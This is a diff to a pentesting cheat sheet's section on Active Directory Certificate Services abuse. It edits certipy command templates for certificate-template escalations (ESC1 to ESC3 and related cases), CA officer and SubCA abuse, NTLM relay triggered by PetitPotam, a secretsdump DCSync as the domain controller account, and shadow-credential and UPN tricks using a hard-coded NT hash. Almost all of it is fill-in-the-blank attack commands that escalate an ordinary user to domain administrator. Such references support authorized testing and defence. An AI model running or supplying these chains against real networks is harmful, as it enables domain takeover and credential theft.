@@ -2707,29 +2707,29 @@ meterpreter > download *
 #### Active Directory Certificate Services (AD CS)
 
 ```c
-certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST>
+certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout
 ```
 
 ##### ESC1: Misconfigured Certificate Templates
 
 ```c
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dns <RHOST>
+certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dns <RHOST>
 certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC2: Misconfigured Certificate Templates
 
 ```c
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template <TEMPLATE>
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
+certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
+certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
 certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC3: Enrollment Agent Templates
 
 ```c
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template <TEMPLATE>
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
+certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
+certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
 certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
@@ -2737,7 +2737,7 @@ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 
 ```c
 certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>
+certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>
 certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
@@ -2745,8 +2745,8 @@ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 
 ```c
 certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -vulnerable -dc-ip 192.168.56.12 -stdout
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template User -upn administrator@<DOMAIN>
-certipy req -username administrator@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template User -upn administrator@<DOMAIN>
+certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
+certipy req -ca '<CA>' -username administrator@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
 certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
@@ -2754,10 +2754,10 @@ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 
 ```c
 certipy ca -ca '<CA>' -add-officer <USERNAME> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
-certipy ca -ca '<CA>' -enable-template <TEMPLATE> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>
+certipy ca -ca '<CA>' -enable-template SubCA -username <USERNAME>@<DOMAIN> -password <PASSWORD>
+certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template SubCA -upn administrator@<DOMAIN>
 certipy ca -ca '<CA>' -issue-request <ID> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
-certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <CA> -retrieve <iD>
+certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -retrieve <ID>
 certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
@@ -2765,7 +2765,7 @@ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 
 ```c
 certipy relay -target 'http://<CA>'
-certipy relay -ca <CA> -template <TEMPLATE>
+certipy relay -ca '<CA>' -template <TEMPLATE>
 python3 PetitPotam.py <RHOST> <DOMAIN>
 certipy auth -pfx dc.pfx -dc-ip <RHOST>
 export KRB5CCNAME=dc.ccache
@@ -2787,7 +2787,7 @@ sudo secretsdump.py -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
 ```c
 certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
 certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
-certipy req -username <USERNAME> -hashes 54296a48cd30259cc88095373cec24da -ca <CA> -template <TEMPLATE>
+certipy req -ca '<CA>' -username <USERNAME> -hashes 54296a48cd30259cc88095373cec24da -template <TEMPLATE>
 certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
 certipy auth -pfx administrator.pfx -domain <DOMAIN>
 ```
